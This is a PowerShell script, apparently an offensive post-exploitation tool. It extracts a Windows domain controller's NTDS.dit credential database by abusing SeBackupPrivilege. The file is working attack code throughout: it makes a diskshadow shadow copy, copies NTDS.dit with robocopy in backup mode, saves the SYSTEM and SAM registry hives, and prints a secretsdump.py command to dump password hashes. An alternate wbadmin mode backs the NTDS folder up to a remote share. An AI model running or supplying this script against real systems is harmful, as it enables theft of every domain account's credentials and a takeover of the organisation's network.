# NTDS.dit Extraction Helper
# Requires: Backup Operators group membership or SeBackupPrivilege
# Usage: .\ntds-extract.ps1 [-Method <diskshadow|wbadmin>] [-OutputPath <path>]

param(
    [ValidateSet("diskshadow", "wbadmin")]
    [string]$Method = "diskshadow",
    
    [string]$OutputPath = "C:\Temp\ntds-extract",
    
    [string]$RemoteShare,  # For wbadmin method
    [string]$RemoteUser,
    [string]$RemotePassword
)

function Test-SeBackupPrivilege {
    Write-Host "Testing SeBackupPrivilege..." -ForegroundColor Cyan
    
    try {
        # Try to access a protected file
        $testPath = "C:\Windows\NTDS\ntds.dit"
        $stream = New-Object System.IO.FileStream $testPath, ([IO.FileMode]::Open), ([IO.FileAccess]::Read), ([IO.FileShare]::Read), 1, ([IO.FileOptions]::BackupSemantics)
        $stream.Close()
        Write-Host "SeBackupPrivilege: AVAILABLE" -ForegroundColor Green
        return $true
    } catch {
        Write-Host "SeBackupPrivilege: NOT AVAILABLE" -ForegroundColor Red
        Write-Host "You need Backup Operators group membership or SeBackupPrivilege enabled" -ForegroundColor Yellow
        return $false
    }
}

function Invoke-DiskShadowExtraction {
    Write-Host "`n=== NTDS.dit Extraction via diskshadow ===" -ForegroundColor Cyan
    
    # Create output directory
    if (-not (Test-Path $OutputPath)) {
        New-Item -ItemType Directory -Path $OutputPath -Force | Out-Null
    }
    
    # Create diskshadow script
    $scriptPath = "$OutputPath\diskshadow-script.txt"
    @"
set verbose on
set metadata $OutputPath\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
"@ | Out-File -FilePath $scriptPath -Encoding ASCII
    
    Write-Host "Executing diskshadow..." -ForegroundColor Yellow
    
    # Execute diskshadow
    $diskshadowOutput = & diskshadow.exe /s $scriptPath 2>&1
    
    if ($diskshadowOutput -match "expose") {
        Write-Host "Shadow copy created successfully" -ForegroundColor Green
        
        # Find the exposed drive letter
        $driveLetter = ($diskshadowOutput | Select-String "expose" | Select-Object -Last 1) -replace '.*expose .* (\w:).*', '$1'
        
        if ($driveLetter) {
            Write-Host "Shadow copy exposed at: $driveLetter" -ForegroundColor Green
            
            # Copy NTDS.dit
            Write-Host "Copying NTDS.dit..." -ForegroundColor Yellow
            robocopy /B "$driveLetter:\Windows\NTDS" $OutputPath ntds.dit /NFL /NDL /NJH /NJS 2>&1 | Out-Null
            
            if (Test-Path "$OutputPath\ntds.dit") {
                Write-Host "NTDS.dit copied successfully" -ForegroundColor Green
            }
            
            # Copy SYSTEM and SAM hives
            Write-Host "Copying registry hives..." -ForegroundColor Yellow
            reg save HKLM\SYSTEM "$OutputPath\SYSTEM.SAV" 2>&1 | Out-Null
            reg save HKLM\SAM "$OutputPath\SAM.SAV" 2>&1 | Out-Null
            
            if (Test-Path "$OutputPath\SYSTEM.SAV" -and Test-Path "$OutputPath\SAM.SAV") {
                Write-Host "Registry hives saved successfully" -ForegroundColor Green
            }
            
            Write-Host "`nExtraction complete. Files saved to: $OutputPath" -ForegroundColor Green
            Write-Host "Use secretsdump.py to extract hashes:" -ForegroundColor Cyan
            Write-Host "  secretsdump.py -ntds $OutputPath\ntds.dit -system $OutputPath\SYSTEM.SAV -hashes lmhash:nthash LOCAL" -ForegroundColor White
        }
    }
    else {
        Write-Host "Diskshadow failed. Check output above." -ForegroundColor Red
    }
}

function Invoke-WbadminExtraction {
    param([string]$Share, [string]$User, [string]$Password)
    
    Write-Host "`n=== NTDS.dit Extraction via wbadmin ===" -ForegroundColor Cyan
    
    if (-not $Share) {
        Write-Host "Remote share required for wbadmin method. Use -RemoteShare parameter." -ForegroundColor Red
        return
    }
    
    # Map network share
    if ($User -and $Password) {
        Write-Host "Mapping network share..." -ForegroundColor Yellow
        net use X: "\\$Share" $Password /user:$User 2>&1 | Out-Null
    }
    
    # Start backup
    Write-Host "Starting backup..." -ForegroundColor Yellow
    echo "Y" | wbadmin start backup -backuptarget:"\\$Share" -include:c:\windows\ntds 2>&1 | Out-Null
    
    # Get versions
    Write-Host "Getting backup versions..." -ForegroundColor Yellow
    $versions = wbadmin get versions 2>&1
    Write-Host $versions
    
    Write-Host "`nNote: Manual recovery required. Use wbadmin start recovery with the version ID." -ForegroundColor Yellow
}

# Main execution
Write-Host "NTDS.dit Extraction Tool" -ForegroundColor Green
Write-Host "========================" -ForegroundColor Green

if (-not (Test-SeBackupPrivilege)) {
    Write-Host "`nCannot proceed without SeBackupPrivilege." -ForegroundColor Red
    exit 1
}

switch ($Method) {
    "diskshadow" { Invoke-DiskShadowExtraction }
    "wbadmin" { Invoke-WbadminExtraction -Share $RemoteShare -User $RemoteUser -Password $RemotePassword }
}
